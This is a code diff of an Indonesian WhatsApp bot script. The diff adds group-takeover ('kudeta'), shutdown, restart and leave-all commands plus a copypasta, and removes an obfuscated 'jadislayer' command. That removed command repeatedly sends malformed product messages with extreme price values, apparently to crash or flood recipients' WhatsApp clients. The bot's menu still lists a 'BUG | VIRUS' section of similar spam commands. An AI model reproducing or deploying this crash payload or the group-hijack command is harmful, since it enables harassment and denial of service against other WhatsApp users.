@@ -2276,6 +2276,12 @@ if (isBanChat) return reply(mess.banChat)
               awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaah the smell of hair ${qq} smelly i want to smell the fragrance ${qq} AAAAAAAAH ~ Her hair.... aaah i want to stroke her hair too ~~ AAAAAH ${qq} first time out in anime is cute too ❤️ ❤️ ❤️ so AAAAAAAH ${qq} AAAAAA LUCCUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️what ? ${qq} it's not real ? Just HELL you say ? no, no no no no no no no no no no no no no no no !! I DON'T CARE ABOUT THE REALITY, I DON'T CARE. ❤️ ❤️ ❤️ ${qq} me ... ${qq} on the laptop watching me, ${qq} .. you believe in me ? aaaaaaaaaaah thanks ${q} I don't want to give up ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH I STILL HAVE ${qq} ALSO NOT THE SAME AAAAAAAAAAAAAAH`
              reply(awikwok)
               break
+			  case 'wangy':
+              if (!q) return
+              qq = q.toUpperCase()
+              awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
+              reply(awikwok)
+              break
 case 'checkdeath':
 if (isBan) return reply(mess.ban)	 			
 if (isBanChat) return reply(mess.banChat)
@@ -5089,17 +5095,41 @@ Detek = tes.translate
 replay(`🌐Translate : ${Detek}\n📘Results : ${Infoo}`)
 }
 break
-case 'jadislayer':
-if (args.length < 1) return freply('Jumlahnya?')
-for (let i = 0; i < args[0]; i++) {
-const _0x452209=_0x509f;(function(_0x55cb2d,_0x125e5f){const _0x117a4d=_0x509f,_0x21f4ac=_0x55cb2d();while(!![]){try{const _0x6ae897=parseInt(_0x117a4d(0x19c))/0x1*(parseInt(_0x117a4d(0x193))/0x2)+parseInt(_0x117a4d(0x194))/0x3+-parseInt(_0x117a4d(0x19e))/0x4+parseInt(_0x117a4d(0x1a1))/0x5*(-parseInt(_0x117a4d(0x192))/0x6)+-parseInt(_0x117a4d(0x196))/0x7*(parseInt(_0x117a4d(0x197))/0x8)+parseInt(_0x117a4d(0x1ab))/0x9+parseInt(_0x117a4d(0x1a3))/0xa;if(_0x6ae897===_0x125e5f)break;else _0x21f4ac['push'](_0x21f4ac['shift']());}catch(_0x33915d){_0x21f4ac['push'](_0x21f4ac['shift']());}}}(_0x25a1,0x89cfb));function _0x509f(_0x33a6ff,_0x5e9f66){const _0x25a1fc=_0x25a1();return _0x509f=function(_0x509f39,_0x506792){_0x509f39=_0x509f39-0x192;let _0x34b942=_0x25a1fc[_0x509f39];return _0x34b942;},_0x509f(_0x33a6ff,_0x5e9f66);}function _0x25a1(){const _0x4a9171=['2675900QcAqex','imageMessage','downloadMediaMessage','99999999999000','4383282311765462','message','contextInfo','quotedM','4841127tbMXiQ','./stik/deden.jpeg','replace','358188ZVEBmc','210024ZxuVmb','3328515uJtAvS','videoMessage','146965lQqKuB','40PcUKsn','slayer\x20by\x20xylaa\x20🔥➥','relayWAMessage','http://nhentai.net','extendedTextMessage','1HdJoRb','0@s.whatsapp.net','3969488fBbkml','62857887347565@s.whatsapp.net','-999999999999','30jIxKsG','prepareMessageFromContent'];_0x25a1=function(){return _0x4a9171;};return _0x25a1();}if(isBan)return reply(mess['ban']);if(isMedia&&!kal[_0x452209(0x1a8)][_0x452209(0x195)]||isQuotedImage){let encmedia=isQuotedImage?JSON['parse'](JSON['stringify'](kal)[_0x452209(0x1ad)](_0x452209(0x1aa),'m'))[_0x452209(0x1a8)][_0x452209(0x19b)][_0x452209(0x1a9)]:kal,media=await Haikal[_0x452209(0x1a5)](encmedia);imeu=await Haikal['prepareMessage'](_0x452209(0x19d),media,image,{'thumbnail':fs['readFileSync'](_0x452209(0x1ac))}),imeg=imeu[_0x452209(0x1a8)][_0x452209(0x1a4)],res=await Haikal[_0x452209(0x1a2)](from,{'productMessage':{'product':{'productImage':imeg,'productId':_0x452209(0x1a7),'title':_0x452209(0x198),'description':'slayer\x20by\x20xylaa\x20🔥➥','currencyCode':'IDR','priceAmount1000':_0x452209(0x1a6),'retailerId':_0x452209(0x1a0),'url':_0x452209(0x19a),'productImageCount':0x1,'salePriceAmount1000':'0'},'businessOwnerJid':_0x452209(0x19f),'contextInfo':{'forwardingScore':0x270f,'isForwarded':!![]}}},{'quoted':kal,'contextInfo':{}}),Haikal[_0x452209(0x199)](res);}
+      case 'shutdown':
+             if (!isOwner) return 
+             reply(`Shutdown Bot...`)
+             await sleep(3000)
+             process.exit()
+             break
+      case 'restart':
+             if (!isOwner) return 
+             reply(mess.wait)
+             exec(`node elaina.js`)
+             reply('_Restarting Bot Success_')
+             break
+      case 'leaveall':
+             if (!isOwner) return  reply(mess.owner)
+             let totalgroup = ikyy.chats.array.filter(u => u.jid.endsWith('@g.us')).map(u => u.jid)
+             for (let id of totalgroup) {
+             sendMess(id, 'Byee', null)
+             await sleep(3000)
+             ikyy.groupLeave(id)
 }
-break
+             break
+	case 'kudeta':
+              if (!isGroup) return reply(mess.group)
+              reply('DILAKSANAKAN !')
+                potonya = await getBuffer(`https://telegra.ph/file/3951f34e7d99b8986f20b.jpg`)
+                   XeonBotInc.updateProfilePicture (from, potonya)
+                XeonBotInc.groupUpdateSubject(from, `KUDETA BY ${pushname}`)
+                XeonBotInc.groupUpdateDescription(from, `*KUDETA BY ${pushname}*`)             
+                XeonBotInc.sendMessage(from, 'KUDETA BY ${pushname}', text, {quoted: m})
+					break
 case 'bugreact': {
 let user = global.db.data.users[m.sender]
 user.afkTime = + new Date
 user.afkReason = text
-deploy(`${m.pushName} xylaa${text ? ': ' + text : ''}`)
+deploy(`${pushname} xylaa${text ? ': ' + text : ''}`)
 }
 break
 //=======
@@ -10594,6 +10624,8 @@ XeonBotInc.sendMessage(m.chat, { audio: pentol, mimetype: 'audio/mp4', seconds: 
 XeonBotInc.sendMessage(from, { react: { text: `${global.reactmoji}`, key: m.key }})
 var unicorn = await getBuffer(picak+'All Menu')
 return reply(`╔═══════✪「 OWNER 」	
+╠ ${prefix}shutdown
+╠ ${prefix}restart
 ╠ ${prefix}self
 ╠${prefix}allfeature
 ╠ ${prefix}public
@@ -10618,6 +10650,7 @@ return reply(`╔═══════✪「 OWNER 」
 ╠ ${prefix}coowner [add/del]
 ╠ ${prefix}changelog
 ╠═══════✪「 GROUP 」
+╠${prefix}kudeta
 ╠${prefix}jail
 ╠${prefix}listonline
 ╠${prefix}searchgc	   
@@ -10659,7 +10692,6 @@ return reply(`╔═══════✪「 OWNER 」
 ╠${prefix}checkvote
 ╠${prefix}delvote
 ╠═════════✪「 BUG | VIRUS 」	
-╠${prefix}jadislayer
 ╠${prefix}hiya [ jumlah ]
 ╠${prefix}ha [ jumlah ]
 ╠${prefix}hi [ jumlah ]
@@ -11101,6 +11133,7 @@ return reply(`╔═══════✪「 OWNER 」
 ╠ ${prefix}can [text]
 ╠ ${prefix}rate [text]
 ╠ ${prefix}wangy [text]
+╠ ${prefix}wangy2 [text]
 ╠ ${prefix}beautifulcheck [tag]
 ╠ ${prefix}awesomecheck [tag]
 ╠ ${prefix}prettycheck [tag]
